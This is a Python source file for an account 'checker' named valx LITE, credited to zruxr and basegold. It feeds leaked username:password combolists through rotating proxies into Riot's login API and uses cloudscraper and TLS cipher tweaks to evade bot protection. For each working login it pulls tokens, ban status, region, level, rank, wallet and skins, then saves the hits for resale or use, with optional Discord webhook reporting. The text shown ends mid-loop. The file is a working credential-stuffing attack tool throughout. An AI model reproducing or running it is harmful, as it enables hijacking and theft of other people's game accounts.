import requests, random, os, sys, time, ctypes, threading, easygui, datetime, webbrowser, shutil, fileinput, os.path, traceback, readchar, json, cloudscraper, pandas, ssl, string
from colorama import Fore, Back, init
from requests import Session, exceptions
from InquirerPy import inquirer, get_style
from InquirerPy.separator import Separator
from fake_useragent import UserAgent as ua
from requests import session
from requests.adapters import HTTPAdapter
from urllib3 import PoolManager
from tkinter import *
from collections import OrderedDict
from discord_webhook import DiscordWebhook, DiscordEmbed
from re import compile
from threading import Thread
from typing import Any

init(convert=True)

ctypes.windll.kernel32.SetConsoleTitleW("valx | LITE made by zruxr and basegold")


with open('config.json', 'r') as config_file:
    config_data = json.load(config_file)
    if config_data["SEND_UNSKINNED"] == False:
        dsk = False
    else:
        dsk = True

    if config_data["SEND_STATS"] == False:
        dur = False
    else:
        dur = True

    if config_data["SEND_WITH_THAT_SKIN"] == False:
        dws = False
    else:
        dws = True

    if config_data["SEND_ONLY_STATS"] == False:
        s_sts = False
    else:
        s_sts = True

if config_data["webhook"] != "":
    webhook = config_data["webhook"]
else:
    pass

proxyless = False
oneline = False

tskin = "un/skinned"
checked = 0
good = 0
timeban = 0
perban = 0
notexist = 0
rate = 0
verified = 0
unverified = 0
xds = []
errors = 0
skinned = 0
no_skins = 0
retries = 0

cpm1 = 0
cpm2 = 0

eu = 0
na = 0
br = 0
kr = 0
latam = 0
ap = 0

unranked = 0
iron = 0
bronze = 0
silver = 0
gold = 0
platinum = 0
diamond = 0
ascendant = 0
immortal = 0
radiant = 0
locked = 0


_1_9 = 0
_10_19 = 0
_20_29 = 0
_30_39 = 0
_40_49 = 0
_50_99 = 0
_100_150 = 0
_151 = 0

a1_9 = 0
a10_19 = 0
a20_29 = 0
a30_39 = 0
a40_49 = 0
a50_100 = 0
a1000 = 0
unkno = 0
_2fa = 0

verified = 0
ratelimit = 0

combos = []
passwords = []
proxies = []
proxy_counter = 0
failed_accounts = []
token = []
token_id = []
entitlement = []

e = datetime.datetime.now()
current_date = e.strftime("%Y-%m-%d-%H-%M-%S")

lock = threading.Lock()

#dirs
region_folders = ["ap", "eu", "na", "latam", "br", "kr"]
level_folders = ['1-10', "10-20", "20-30", "30-40", "40-50", "50-100", "100+", "locked"]
fold = ["skinned", "unskinned", "log"]

if not os.path.exists("results"):
    os.makedirs("results/")
if not os.path.exists(f"results/{current_date}/banned"):
    os.makedirs(f"results/{current_date}/banned/")

for folder in fold:
    if not os.path.exists(f"results/{current_date}/"+folder+"/region"):
        os.makedirs(f"results/{current_date}/"+folder+"/region")
    if not os.path.exists(f"results/{current_date}/"+folder+"/level"):
        os.makedirs(f"results/{current_date}/"+folder+"/level")

for folder in region_folders:
    if not os.path.exists(f"results/{current_date}/region/"+folder):
        os.makedirs(f"results/{current_date}/region/"+folder)

for folder2 in level_folders:
    if not os.path.exists(f"results/{current_date}/level/"+folder2):
        os.makedirs(f"results/{current_date}/level/"+folder2)

#colors
red = Fore.YELLOW
black = Fore.BLACK
green = Fore.GREEN
yellow = Fore.YELLOW
blue = Fore.BLUE
mov = Fore.MAGENTA
cyan = Fore.CYAN
wht = Fore.WHITE
reset = Fore.RESET
lb = Fore.LIGHTBLUE_EX
grey = Fore.LIGHTBLACK_EX
lr = Fore.LIGHTRED_EX

#titles
title = f'''
                                {mov}⢀⣀⣀⠀⠀⠀⠀⠀{reset}⢀⣀⣀⣀⣀⣀⡀
                                {mov}⠈⢿⣿⣆⠀⠀⠀{reset}⣠⣿⣿⣿⣿⣿⠏
                                {mov}⠀⠈⢻⣿⣦⠀⣰⣶⡶{lr}⢂{reset}⣾⣿⠋
                                {mov}⠀⠀⠀⢻⣿⣿⣿⡟{lr}⢡{reset}⣿⣿⠃⠀⠀
                                {mov}⠀⠀⠀⠈⢻⣿⡿{lr}⢡{reset}⣾⣿⠏⠀⠀⠀
                                {mov}⠀⠀⠀⠀⠀⠟{reset}⢠⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                {mov}⠀⠀⠀⠀⠀⠀{reset}⠹⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                {mov}⠀⠀⠀⠀⠀⠀⠀{reset}⠁
                '''

CIPHERS = [
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-CHACHA20-POLY1305',
    'ECDHE+AES128',
    'RSA+AES128',
    'ECDHE+AES256',
    'RSA+AES256',
    'ECDHE+3DES',
    'RSA+3DES'
]
#http adapter
class SSLAdapter(HTTPAdapter):
    def init_poolmanager(self, *a: Any, **k: Any) -> None:
        c = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        c.set_ciphers(':'.join(CIPHERS))
        k['ssl_context'] = c
        return super(SSLAdapter, self).init_poolmanager(*a, **k)


def getcombos():
    global path
    try:
        print(f'\n {lr}~{reset} Path to combolist >>> ')
        time.sleep(1)
        path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'valx - Select combos', multiple= False)
        with open(path, 'r', encoding="utf-8") as f:
            for line in f.readlines():
                line = line.replace("\n", "")
                combos.append(line)
                xds.append(line)
        first_line = combos[0]
        shutil.copyfile(path, f"results/{current_date}/used_combo.txt")
        shutil.copyfile(path, f"results/{current_date}/remain_accs.txt")
    except:
        print(f'\n {lr}!{reset} Failed to open combofile, is it a .txt? Is it formated correctly? Are you an idiot?!')
        os.system('pause >nul')
        quit()

def getproxies():
    try:
        print(f'\n {lr}~{reset} Path to proxy file >>> ')
        time.sleep(1)
        path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'valx - Select proxy', multiple= False)
        with open(path, "r", encoding="utf-8") as f:
            for line in f.readlines():
                line = line.replace("\n", "")
                proxies.append(line)
        first_line = proxies[0]
    except Exception:
        print(f"\n {lr}!{reset} Failed to open prxoyfile lol")

def session1():
        session = requests.Session()
        session.trust_env = False
        return session

def lockscreen():
    while True:
        os.system('mode con: cols=144 lines=30')

def screen():
    global good, timeban, perban, notexist, rate, checked, verified, unverified, errors, retries, proxyless, cpm1, cpm2, unkno, _2fa, path, oneline
    global skinned, no_skins, good, eu, na, br, kr, latam, ap, ratelimit, unranked, iron, bronze, silver, gold, platinum, diamond, ascendant, immortal, radiant, locked, _1_9, _10_19, _20_29, _30_39, _40_49, _50_99, _100_150, _151, a1_9, a10_19, a20_29, a30_39, a40_49, a50_100, a1000
    cpm2 = cpm1
    cpm1 = 0
    space = " "
    prc = checked/(len(combos) + len(failed_accounts))*100
    prc = f'{str(round(prc,1))}{red}%{reset}'
    percent=138*(checked/(len(combos) + len(failed_accounts)))
    bar=f'{Fore.LIGHTRED_EX}━{Fore.RESET}'*int(percent)+f'{Fore.WHITE}━{Fore.RESET}'*int(138-percent)
    pathh = os.path.basename(path)
    bann = timeban + perban
    ctypes.windll.kernel32.SetConsoleTitleW(f"valx LITE made by baselgold | Hits: {good} | Bad: {notexist + bann} | Ratelimited: {rate} | Checked: {checked}/{len(xds)}")
    if config_data['webhook'] != "":
        shc = f"{red} Using A Webhook {reset}" 
    else:
        shc = f"{red} Not Using A Webhook {reset}"
    if not proxyless:
        pxy = f"{reset}[{red}{len(proxies)}{reset}]{reset}"
    else:
        pxy = f"{reset}[{red}none{reset}]{reset}"

    scrn = f'''



                        {lr}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    {red}⢀⣀⣀⠀⠀⠀⠀⠀{reset}⢀⣀⣀⣀⣀⣀⡀     {lr}┃ {red}[{reset}~{red}]{reset} Good:      {red}{red}>>{reset}{reset} {green}{good}{reset}{space * (12 - len(str(good)))}{lr}┃┃                               ┃┃                               ┃{reset}
    {red}⠈⢿⣿⣆⠀⠀⠀{reset}⣠⣿⣿⣿⣿⣿⠏⠀     {lr}┃ {red}[{reset}~{red}]{reset} Bad:       {red}>>{reset} {red}{notexist}{reset}{space * (12 - len(str(notexist)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Skins 1-10:      {red}>>{reset} {red}{_1_9}{reset}{space * (6 - len(str(_1_9)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Level 1-10:      {red}>>{reset} {grey}{a1_9}{reset}{space * (6 - len(str(a1_9)))}{lr}┃{reset}
    {red}⠀⠈⢻⣿⣦⠀⣰⣶⡶{lr}⢂{reset}⣾⣿⠋⠀⠀⠀⠀   {lr}┃ {red}[{reset}~{red}]{reset} Error:     {red}>>{reset} {yellow}{errors}{reset}{space * (12 - len(str(errors)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Skins 10-20:     {red}>>{reset} {red}{_10_19}{reset}{space * (6 - len(str(_10_19)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Level 10-20:     {red}>>{reset} {grey}{a10_19}{reset}{space * (6 - len(str(a10_19)))}{lr}┃{reset}
    {red}⠀⠀⠀⢻⣿⣿⣿⡟{lr}⢡{reset}⣿⣿⠃⠀⠀⠀⠀⠀⠀  {lr}┃ {red}[{reset}~{red}]{reset} Retries:   {red}>>{reset} {mov}{retries}{reset}{space * (12 - len(str(retries)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Skins 20-30:     {red}>>{reset} {red}{_20_29}{reset}{space * (6 - len(str(_20_29)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Level 20-30:     {red}>>{reset} {grey}{a20_29}{reset}{space * (6 - len(str(a20_29)))}{lr}┃{reset}
    {red}⠀⠀⠀⠈⢻⣿⡿{lr}⢡{reset}⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀{lr}  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛┃ {red}[{reset}~{red}]{reset} Skins 30-40:     {red}>>{reset} {red}{_30_39}{reset}{space * (6 - len(str(_30_39)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Level 30-40:     {red}>>{reset} {grey}{a30_39}{reset}{space * (6 - len(str(a30_39)))}{lr}┃{reset}
    {red}⠀⠀⠀⠀⠀⠟{reset}⢠⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀ {lr}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓┃ {red}[{reset}~{red}]{reset} Skins 40-50:     {red}>>{reset} {red}{_40_49}{reset}{space * (6 - len(str(_40_49)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Level 40-50:     {red}>>{reset} {grey}{a40_49}{reset}{space * (6 - len(str(a40_49)))}{lr}┃{reset}
    {red}⠀⠀⠀⠀⠀⠀{reset}⠹⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{lr}┃ {red}[{reset}~{red}]{reset} No Skins:  {red}>>{reset} {yellow}{no_skins}{reset}{space * (12 - len(str(no_skins)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Skins 50-100:    {red}>>{reset} {red}{_50_99}{reset}{space * (6 - len(str(_50_99)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Level 50-100:    {red}>>{reset} {grey}{a50_100}{reset}{space * (6 - len(str(a50_100)))}{lr}┃{reset}
    {red}⠀⠀⠀⠀⠀⠀⠀{reset}⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{lr}┃ {red}[{reset}~{red}]{reset} Skinned:   {red}>>{reset} {green}{skinned}{reset}{space * (12 - len(str(skinned)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Skins 100-150:   {red}>>{reset} {red}{_100_150}{reset}{space * (6 - len(str(_100_150)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Level 100++:     {red}>>{reset} {grey}{a1000}{reset}{space * (6 - len(str(a1000)))}{lr}┃{reset}
                        {lr}┃ {red}[{reset}~{red}]{reset} Banned:    {red}>>{reset} {red}{bann}{reset}{space * (12 - len(str(bann)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Skins 150++:     {red}>>{reset} {red}{_151}{reset}{space * (6 - len(str(_151)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Level Locked:    {red}>>{reset} {grey}{unkno}{reset}{space * (6 - len(str(unkno)))}{lr}┃{reset}
                        {lr}┃ {red}[{reset}~{red}]{reset} 2FA:       {red}>>{reset} {lb}{_2fa}{reset}{space * (12 - len(str(_2fa)))}{lr}┃┃                               ┃┃                               ┃{reset}
                        {lr}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
                        {lr}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
                        {lr}┃                               {lr}┃┃{reset} {red}[{reset}~{red}]{reset} Unranked    {red}>>{reset} {mov}{unranked}{reset}{space * (11 - len(str(unranked)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} FA:           {red}>>{reset} {cyan}{unverified}{reset}{space * (9 - len(str(unverified)))}{lr}┃{reset}
                        {lr}┃ {red}[{reset}~{red}]{reset} EU:    {red}>>{reset} {lb}{eu}{reset}{space * (16 - len(str(eu)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Iron        {red}>>{reset} {mov}{iron}{reset}{space * (11 - len(str(iron)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} NFA:          {red}>>{reset} {cyan}{verified}{reset}{space * (9 - len(str(verified)))}{lr}┃{reset}
                        {lr}┃ {red}[{reset}~{red}]{reset} NA:    {red}>>{reset} {lb}{na}{reset}{space * (16 - len(str(na)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Bronze      {red}>>{reset} {mov}{bronze}{reset}{space * (11 - len(str(bronze)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Not playd:    {red}>>{reset} {cyan}soon{reset}     {lr}┃{reset}
                        {lr}┃ {red}[{reset}~{red}]{reset} AP:    {red}>>{reset} {lb}{ap}{reset}{space * (16 - len(str(ap)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Silver      {red}>>{reset} {mov}{silver}{reset}{space * (11 - len(str(silver)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Inactive:     {red}>>{reset} {cyan}soon{reset}     {lr}┃{reset}
                        {lr}┃ {red}[{reset}~{red}]{reset} KR:    {red}>>{reset} {lb}{kr}{reset}{space * (16 - len(str(kr)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Gold        {red}>>{reset} {mov}{gold}{reset}{space * (11 - len(str(gold)))}{lr}┃┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}
                        {lr}┃ {red}[{reset}~{red}]{reset} LA:    {red}>>{reset} {lb}{latam}{reset}{space * (16 - len(str(latam)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Platinum    {red}>>{reset} {mov}{platinum}{reset}{space * (11 - len(str(platinum)))}{lr}┃{reset} {red}[{reset}~{red}]{reset} Combo {red}[{reset}{pathh}{red}]{reset}
                        {lr}┃ {red}[{reset}~{red}]{reset} BR:    {red}>>{reset} {lb}{br}{reset}{space * (16 - len(str(br)))}{lr}┃┃{reset} {red}[{reset}~{red}]{reset} Diamond     {red}>>{reset} {mov}{diamond}{reset}{space * (11 - len(str(diamond)))}{lr}┃{reset} {red}[{reset}~{red}]{reset} Accounts {red}> {reset}{checked}{red}/{reset}{len(xds)}
                        {lr}┃                               {lr}┃┃{reset} {red}[{reset}~{red}]{reset} Ascendant   {red}>>{reset} {mov}{ascendant}{reset}{space * (11 - len(str(immortal)))}{lr}┃{reset} {red}[{reset}~{red}]{reset} Proxies  {red}> {pxy}
                        {lr}┃                               {lr}┃┃{reset} {red}[{reset}~{red}]{reset} Immortal    {red}>>{reset} {mov}{immortal}{reset}{space * (11 - len(str(radiant)))}{lr}┃{reset} {red}[{reset}~{red}]{shc}
                        {lr}┃                               {lr}┃┃{reset} {red}[{reset}~{red}]{reset} Radiant     {red}>>{reset} {mov}{radiant}{reset}{space * (11 - len(str(radiant)))}{lr}┃
                        {lr}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset} {red}LITE VERSION {reset}by {mov}baselgold and Zruxr{reset}
                                                                 [{prc}]
  {red}┃{reset}{bar}{red}┃{reset}'''
    os.system("cls")
    print(scrn)


def checker(combo, proxy = None):
    global good, timeban, perban, notexist, rate, checked, verified, unverified, errors, retries, token, token_id, entitlement, cpm2, cpm1, unkno, _2fa, dsk, dur, dws, s_sts, c
    global skinned, no_skins, good, eu, na, br, kr, latam, ap, ratelimit, unranked, iron, bronze, silver, gold, platinum, diamond, ascendant, immortal, radiant, locked, _1_9, _10_19, _20_29, _30_39, _40_49, _50_99, _100_150, _151, a1_9, a10_19, a20_29, a30_39, a40_49, a50_100, a1000
    try:
        try:
            username, password = combo.split(":")
        except:
            errors += 1
            return
        proxies = None
        if proxy != None:
            UseProxy = f'''http://{proxy}'''
            proxies = {
                'https': UseProxy,
                'http': UseProxy}
        headers = OrderedDict({
            "Accept-Language": "en-US,en;q=0.9",
            "Accept": "application/json, text/plain, */*",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'
        })
        session = session1()
        session.headers = headers
        if not proxyless:
            scraper = cloudscraper.create_scraper(sess = session)
            req = scraper
        else:
            session.mount('https://', SSLAdapter())
            req = session
        nonce = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(23))
        data = {
            "acr_values": "urn:riot:bronze",
            "claims": "",
            "client_id": "riot-client",
            "nonce": f'{nonce}',
            "redirect_uri": "http://localhost/redirect",
            "response_type": "token id_token",
            "scope": "openid link ban lol_region",
        }
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        }
        try:
            r = req.post(f'https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers, proxies=proxies, timeout=10)
            data = {
                'type': 'auth',
                'username': username,
                'password': password
            }
            r2 = req.put('https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers,  proxies=proxies, timeout=5)
        except Exception as e:
            retries += 1
            failed_accounts.append(combo)
            return
        try:
            data = r2.json()
        except Exception as e:
            retries += 1
            failed_accounts.append(combo)
            return
        if "access_token" in r2.text:
            pattern = compile(
                'access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
            data = pattern.findall(data['response']['parameters']['uri'])[0]
            token = data[0]
            token_id = data[1]
            if oneline == False:
                with open(f"results/{current_date}/remain_accs.txt", "r", encoding="utf-8") as f:
                    lines = f.readlines()
                with open(f"results/{current_date}/remain_accs.txt", "w", encoding="utf-8") as f:
                    for line in lines:
                        if line.strip("\n") != username + ":" + password:
                            f.write(line)
            checked += 1
            cpm1 += 1
        elif "You do not have access to auth.riotgames.com" in r2.text:
            retries += 1
            failed_accounts.append(combo)
            return
        elif "auth_failure" in r2.text or "archived_account" in r2.text or "invalid_session_id" in r2.text or "pending_forget" in r2.text:
            checked += 1
            notexist += 1
            cpm1 += 1
            with open(f"results/{current_date}/remain_accs.txt", "r", encoding="utf-8") as f:
                lines = f.readlines()
            with open(f"results/{current_date}/remain_accs.txt", "w", encoding="utf-8") as f:
                for line in lines:
                    if line.strip("\n") != username + ":" + password:
                        f.write(line)
            if oneline == True:
                print("Invalid Account !")
            return
        elif "rate_limited" in r2.text:
            retries += 1
            rmtext = open(f"Results/{current_date}/ratelimit.txt", "a+", encoding="utf-8")
            rmtext.write(f"{username}:{password}\n")
            rmtext.close()
            failed_accounts.append(combo)
            with open(f"results/{current_date}/remain_accs.txt", "r", encoding="utf-8") as f:
                lines = f.readlines()
            with open(f"results/{current_date}/remain_accs.txt", "w", encoding="utf-8") as f:
                for line in lines:
                    if line.strip("\n") != username + ":" + password:
                        f.write(line)
            checked += 1
            cpm1 += 1
            if not proxyless:
                time.sleep(5)
            else:
                time.sleep(30)
            if oneline == True:
                print("Rate Limit !!!")
            return
        elif 'multifactor' in r2.text:
            _2fa += 1
            checked += 1
            cpm1 += 1
            rmtext1 = open(f"Results/{current_date}/2FA.txt", "a+", encoding="utf-8")
            rmtext1.write(f"{username}:{password}\n")
            rmtext1.close()
            with open(f"results/{current_date}/remain_accs.txt", "r", encoding="utf-8") as f:
                lines = f.readlines()
            with open(f"results/{current_date}/remain_accs.txt", "w", encoding="utf-8") as f:
                for line in lines:
                    if line.strip("\n") != username + ":" + password:
                        f.write(line)
            return
        elif "server_error" in r2.text:
            errors += 1
            with open(f"results/{current_date}/remain_accs.txt", "r", encoding="utf-8") as f:
                lines = f.readlines()
            with open(f"results/{current_date}/remain_accs.txt", "w", encoding="utf-8") as f:
                for line in lines:
                    if line.strip("\n") != username + ":" + password:
                        f.write(line)
        else:
            input(r2.text + "Send this to Zruxr")
            pattern = compile('access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
            data = pattern.findall(data['response']['parameters']['uri'])[0]
            token = data[0]
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
            'Authorization': f'Bearer {token}',
        }
        
        r = req.post('https://entitlements.auth.riotgames.com/api/token/v1', headers=headers, json={}, proxies=proxies)
        entitlement = r.json()['entitlements_token']
        r = req.post('https://auth.riotgames.com/userinfo', headers=headers, json={}, proxies=proxies)
        data = r.json()
 #check ban       
        try:
            GameName =  r.text.split('game_name":"')[1].split('"')[0]
        except Exception as e:
            GameName = "null"    
        CountryID = r.text.split('country":"')[1].split('"')[0]
        try:            
            Tag = r.text.split('tag_line":"')[1].split('"')[0]
        except Exception as e:
            Tag = "null"
        Sub = r.text.split('sub":"')[1].split('"')[0]
        EmailVerified = r.text.split('email_verified":')[1].split(',"')[0]
        data1 = data['acct']
        unix_time = data1['created_at']
        unix_time = int(unix_time)
        result_s = pandas.to_datetime(unix_time,unit='ms')
        str(result_s)        
        typebanned = None
        result_s1 = None
        try:
            data = r.json()
            data2 = data['ban']
            data3 = data2['restrictions']
            for x in data3:
                typebanned = x['type']
            if typebanned == "PERMANENT_BAN" or typebanned == "PERMA_BAN":
                with open(f"results/{current_date}/remain_accs.txt", "r", encoding="utf-8") as f:
                    lines = f.readlines()
                with open(f"results/{current_date}/remain_accs.txt", "w", encoding="utf-8") as f:
                    for line in lines:
                        if line.strip("\n") != username + ":" + password:
                            f.write(line)
                result_s1 = "Permantent"
                bannedtxt = open(f"results/{current_date}/banned/ban.txt", "a+", encoding="utf-8")
                bannedtxt.write(f"{username}:{password} | Banntype: {typebanned} | Expire: {result_s1} | Creation: {result_s}\n")
                bannedtxt.close()
                perban += 1
                return

            elif typebanned == "TIME_BAN":
                with open(f"results/{current_date}/remain_accs.txt", "r", encoding="utf-8") as f:
                    lines = f.readlines()
                with open(f"results/{current_date}/remain_accs.txt", "w", encoding="utf-8") as f:
                    for line in lines:
                        if line.strip("\n") != username + ":" + password:
                            f.write(line)
                for y in data3:
                    lol = y['dat']
                exeperationdate = lol['expirationMillis']
                unix_time1 = exeperationdate
                unix_time1 = int(unix_time1)
                result_s1 = pandas.to_datetime(unix_time1,unit='ms')
                str(result_s1)
                banneydtxt1 = open(f"results/{current_date}/banned/timeban.txt", "a+", encoding="utf-8")
                banneydtxt1.write(f"{username}:{password} | Banntype: {typebanned} | Expire: {result_s1} | Creation: {result_s}\n")
                banneydtxt1.close()
                timeban += 1
                return
                
        except:
            if typebanned == None:
                typebanned = "Unbanned"
                bannedtxt12 = open("results//good.txt", "a+", encoding="utf-8")
                bannedtxt12.write(f"[--------------[valx]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n[-------------------------------------]\n\n")
                bannedtxt12.close()
                good += 1
                
        headers ={
            "X-Riot-Entitlements-JWT": entitlement,
            "Authorization": f"Bearer {token}"
        }
        try:
            json = {"id_token": token_id}
            r = req.put('https://riot-geo.pas.si.riotgames.com/pas/v1/product/valorant',json=json, headers=headers)
            data = r.json()
            Region = data['affinities']['live']
        except:
            Region = "na"
        regg = ""
        if Region == "eu":
            Region = "eu"
            eu += 1
        elif Region == "na":
            Region = "na"
            na += 1
        elif Region == "kr":
            Region = "kr"
            kr += 1
        elif Region == "ap":
            Region = "ap"
            ap += 1
        elif Region == "latam":
            Region = "na"
            regg = "la2"
            latam +=1 
        elif Region == "br":
            Region = "na"
            regg = "br2"
            br += 1

        headers ={
            "X-Riot-Entitlements-JWT": entitlement,
            "Authorization": f"Bearer {token}"
        }
        try:
            r = requests.get(f"https://pd.{Region}.a.pvp.net/account-xp/v1/players/{Sub}", headers=headers)
            data = r.json()
            AccountLevel = data["Progress"]["Level"]
        except:
            unkno += 1
        level_a = AccountLevel
        if level_a in range(1, 9):
            a1_9 += 1
            levelc = "1-10"
        elif level_a in range(10, 19):
            a10_19 += 1
            levelc = "10-20"
        elif level_a in range(20, 29):
            a20_29 += 1
            levelc = "20-30"
        elif level_a in range(30, 39):
            a30_39 += 1
            levelc = "30-40"
        elif level_a in range(40, 49):
            a40_49 += 1
            levelc = "40-50"
        elif level_a in range(50, 100):
            a50_100 += 1
            levelc = "50-100"
        elif level_a in range(101, 2000):
            a1000 += 1
            levelc = "100+"
        else:
            levelc = "locked"
            unkno += 1
        RankIDtoRank = {"0":"Unranked","1":"Unused1", "2":"Unused2" ,"3":"Iron 1" ,"4":"Iron 2" ,"5":"Iron 3" ,"6":"Bronz 1" ,"7":"Bronz 2" ,"8":"Bronz 3" ,"9":"Silver 1" ,"10":"Silver 2", "11":"Silver 3" ,"12":"Gold 1" ,"13":"Gold 2" ,"14":"Gold 3" ,"15":"Platinum 1" ,"16":"Platinum 2" ,"17":"Plantinum 3" ,"18":"Diamond 1" ,"19":"Diamond 2" ,"20":"Diamond 3" ,"21":"Ascendant 1" ,"22":"Ascendant 2" ,"23":"Ascendant 3" ,"24":"Immortal 1" ,"25":"Immortal 2" ,"26":"Immortal 3" ,"27":"Radiant"}

        PvpNetHeaders = {"Content-Type": "application/json",
                        "Authorization": f"Bearer {token}",
                        "X-Riot-Entitlements-JWT": entitlement,
                        "X-Riot-ClientVersion": "release-01.08-shipping-10-471230",
                        "X-Riot-ClientPlatform": "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"
        }
        try:
            GetPoints = session.get(f"https://pd.{Region}.a.pvp.net/store/v1/wallet/{Sub}",headers=PvpNetHeaders)
            ValorantPoints = GetPoints.json()["Balances"]["85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741"]
            Radianite = GetPoints.json()["Balances"]["e59aa87c-4cbf-517a-5983-6e81511be9b7"]
        except:
            ValorantPoints = "UnKnow"
            Radianite = "UnKnow" 
        try:
            r = session.get(f"https://pd.{Region}.a.pvp.net/match-history/v1/history/{Sub}?startIndex=0&endIndex=10",headers=PvpNetHeaders)
            data = r.json()
            data2 = data["History"]
            for x in data2:
                data3 = x['GameStartTime']
            unix_time1 = data3
            unix_time1 = int(unix_time1)
            result_s2 = pandas.to_datetime(unix_time1,unit='ms')
            str(result_s2)
            last_time = result_s2
        except:
            result_s2 = "Unkown"
            last_time = "Unkown"
        try:
            CheckRanked = session.get(f"https://pd.{Region}.a.pvp.net/mmr/v1/players/{Sub}/competitiveupdates",headers=PvpNetHeaders)

            if '","Matches":[]}' in CheckRanked.text:
                Rank = "UnRanked"
                    
            else:
                RankID = CheckRanked.text.split('"TierAfterUpdate":')[1].split(',"')[0]
                Rank = RankIDtoRank[RankID] 
        except:
            Rank = "Unknow"

        headers ={
        "X-Riot-Entitlements-JWT": entitlement,
        "Authorization": f"Bearer {token}"
        }
        Rank = Rank.lower()
        if "unranked" in Rank:
            unranked += 1
        if "iron" in Rank:
            iron += 1
        if "bronz" in Rank:
            bronze += 1
        if "silver" in Rank:
            silver += 1
        if "gold" in Rank:
            gold += 1
        if "platinum" in Rank:
            platinum += 1
        if "diamond" in Rank:
            diamond += 1
        if "ascendant" in Rank:
            ascendant += 1
        if "immortal" in Rank:
            immortal += 1
        if "radiant" in Rank:
            radiant += 1
        else:
            locked += 1
        try:
            r = requests.get(f"https://pd.{Region}.a.pvp.net/store/v1/entitlements/{Sub}/e7c63390-eda7-46e0-bb7a-a6abdacd2433",headers=headers)
        except Exception as e:
            retries += 1
            failed_accounts.append(combo)
            return
        response_API = requests.get('https://valorant-api.com/v1/weapons/skins/?language=en-US')
        response = response_API.text
        userSkins = []
        userChromas = []
        SkinNumber = 0
        ChromasNumber = 0
        SkinStr = ""
        SkinStr2 = ""
        ChromasStr = ""
        ChromasStr2 = ""
        tskin = ""
        category = ""
        Skins = r.json()["Entitlements"]
        for skin in Skins:
            skinid = skin['ItemID'].lower()
